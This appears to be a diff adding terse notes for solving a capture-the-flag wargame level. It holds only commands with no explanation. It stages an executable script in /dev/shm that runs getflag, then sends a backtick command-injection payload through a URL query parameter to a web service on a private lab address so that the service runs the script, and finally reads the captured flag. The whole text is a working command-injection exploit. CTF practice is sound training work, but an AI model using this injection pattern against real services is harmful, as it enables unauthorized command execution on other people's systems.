@@ -1,0 +1,10 @@
+vim /dev/shm/LEVEL12
+
+#!/bin/sh
+getflag > /tmp/flag12
+
+chmod +x /dev/shm/LEVEL12
+
+http://192.168.59.3:4646/?x="`/*/*/LEVEL12`"
+
+cat /tmp/flag12
